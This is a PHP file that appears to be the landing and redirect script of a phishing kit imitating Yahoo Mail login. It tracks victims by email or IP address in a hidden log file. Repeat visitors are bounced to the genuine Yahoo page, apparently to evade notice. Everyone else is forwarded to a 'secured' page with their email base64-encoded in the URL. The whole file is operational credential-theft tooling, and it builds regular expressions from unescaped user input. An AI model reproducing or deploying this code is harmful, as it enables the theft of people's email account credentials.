<?php
include "latter-day-saints.php";

//////////////////////////////////////////////////////////
//Check if U've bin here before
//////////////////////////////////////////////////////////
if($iKik == 0) // for email
{
  if(!isset($_GET["ext_user"]))
  {
    //if no email. use IP
    $iKik = 1;
    $setFile = "dustbin/.ip";
  }
  else
  {

    /// Maybe sumtin wrong round here.test
    $checkKik = "/".$_GET["ext_user"]."/i";
    $openDat = file_get_contents($setFile);
    if(preg_match($checkKik, $openDat))
    {
      // send to redirecting.php
    header ('Location: secured/redirecting.php?one=1&lk=https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd');
    die();
    }
  }
}

if($iKik == 1) // for IP
{
  $checkKik = "/".getenv("REMOTE_ADDR")."/i";
  $openDat = file_get_contents($setFile);
  if(preg_match($checkKik, $openDat))
  {
    // send to redirecting.php
    header ('Location: secured/redirecting.php?one=1&lk=https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd');
    die();
  }
}
//////////////////////////////////////////////////////////


//expect $_GET from link
//but if not, it's cool anyway
if($emailGrabber == 0)
{
  header ('Location: secured/index.php?lk=https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd');
}
else
{
  $ext_user = 0; // initializer
  if(isset($_GET["ext_user"]))
  {
    $ext_user = base64_encode($_GET["ext_user"]);
  }
  header ('Location: secured/index.php?ext='.$ext_user.'&lk=https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd');
}
?>
